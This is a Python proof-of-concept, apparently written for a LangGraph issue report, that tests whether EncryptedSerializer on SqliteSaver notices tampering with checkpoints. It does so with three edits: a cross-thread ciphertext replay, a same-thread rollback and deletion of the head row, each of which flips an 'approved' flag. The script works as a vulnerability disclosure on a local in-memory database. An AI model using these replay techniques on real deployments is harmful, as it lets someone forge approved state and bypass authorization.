"""Row-replay check for LangGraph EncryptedSerializer on SqliteSaver (issue #9004).

Two edits, both using only genuine ciphertext written by the checkpointer itself:
  A. cross-thread: copy thread "alice"'s encrypted head checkpoint over thread "bob"'s head
  B. rollback: copy an older encrypted checkpoint of "bob" over "bob"'s head
  C. head deletion: delete "bob"'s newest checkpoint row (no forging at all)
Verdict per edit: ACCEPTED (forged state loaded) or REJECTED (load raised).
"""
import sqlite3
import sys
import importlib.metadata as md
from typing import TypedDict
from langgraph.graph import StateGraph, START, END
from langgraph.checkpoint.sqlite import SqliteSaver
from langgraph.checkpoint.serde.encrypted import EncryptedSerializer

KEY = b"0123456789abcdef0123456789abcdef"

class S(TypedDict):
    approved: bool
    step: int

def node(s: S) -> S:
    return {"approved": s["approved"], "step": s["step"] + 1}

def build():
    conn = sqlite3.connect(":memory:", check_same_thread=False)
    saver = SqliteSaver(conn, serde=EncryptedSerializer.from_pycryptodome_aes(key=KEY))
    g = StateGraph(S); g.add_node("n", node); g.add_edge(START, "n"); g.add_edge("n", END)
    return conn, saver, g.compile(checkpointer=saver)

def head(conn, tid):
    return conn.execute("select checkpoint_id,type,checkpoint from checkpoints where thread_id=? "
                        "order by checkpoint_id desc limit 1", (tid,)).fetchone()

def overwrite(conn, tid, cid, typ, blob):
    conn.execute("update checkpoints set type=?, checkpoint=? where thread_id=? and checkpoint_id=?",
                 (typ, blob, tid, cid)); conn.commit()

def read(app, tid):
    try:
        return "ok", app.get_state({"configurable": {"thread_id": tid}}).values
    except Exception as e:
        return "raised", f"{type(e).__name__}: {e}"

def main():
    print("langgraph-checkpoint", md.version("langgraph-checkpoint"),
          "| langgraph-checkpoint-sqlite", md.version("langgraph-checkpoint-sqlite"))
    import inspect
    import langgraph.checkpoint.serde.encrypted as enc
    print("AAD binding present in EncryptedSerializer:", "aad" in inspect.getsource(enc))
    results = {}

    # A. cross-thread replay
    conn, saver, app = build()
    app.invoke({"approved": True, "step": 0}, {"configurable": {"thread_id": "alice"}})
    app.invoke({"approved": False, "step": 0}, {"configurable": {"thread_id": "bob"}})
    print("A before:", read(app, "bob")[1])
    a_cid, a_typ, a_blob = head(conn, "alice"); b_cid, _, _ = head(conn, "bob")
    print("A stored type:", a_typ)
    overwrite(conn, "bob", b_cid, a_typ, a_blob)
    st, val = read(app, "bob"); print("A after: ", st, val)
    results["A cross-thread replay"] = "ACCEPTED" if st == "ok" and val.get("approved") is True else "REJECTED"

    # B. same-thread rollback
    conn, saver, app = build()
    cfg = {"configurable": {"thread_id": "bob"}}
    app.invoke({"approved": False, "step": 0}, cfg)
    app.update_state(cfg, {"approved": True})
    print("B before:", read(app, "bob")[1])
    rows = conn.execute("select checkpoint_id,type,checkpoint from checkpoints where thread_id='bob' "
                        "order by checkpoint_id").fetchall()
    old_cid = next(h.config["configurable"]["checkpoint_id"] for h in app.get_state_history(cfg)
                   if h.values.get("approved") is False)
    old = next(r for r in rows if r[0] == old_cid)
    head_cid = rows[-1][0]
    overwrite(conn, "bob", head_cid, old[1], old[2])
    st, val = read(app, "bob"); print("B after: ", st, val)
    results["B same-thread rollback"] = "ACCEPTED" if st == "ok" and val.get("approved") is False else "REJECTED"

    # C. head deletion
    conn, saver, app = build()
    app.invoke({"approved": False, "step": 0}, cfg)
    app.update_state(cfg, {"approved": True})
    print("C before:", read(app, "bob")[1])
    conn.execute("delete from checkpoints where thread_id='bob' and checkpoint_id=?", (head(conn, "bob")[0],))
    conn.commit()
    st, val = read(app, "bob"); print("C after: ", st, val)
    results["C head deletion"] = "ACCEPTED" if st == "ok" and val.get("approved") is False else "REJECTED"

    print("\nRESULT")
    for k, v in results.items(): print(f"  {k}: {v}")
    sys.exit(0)

if __name__ == "__main__":
    main()
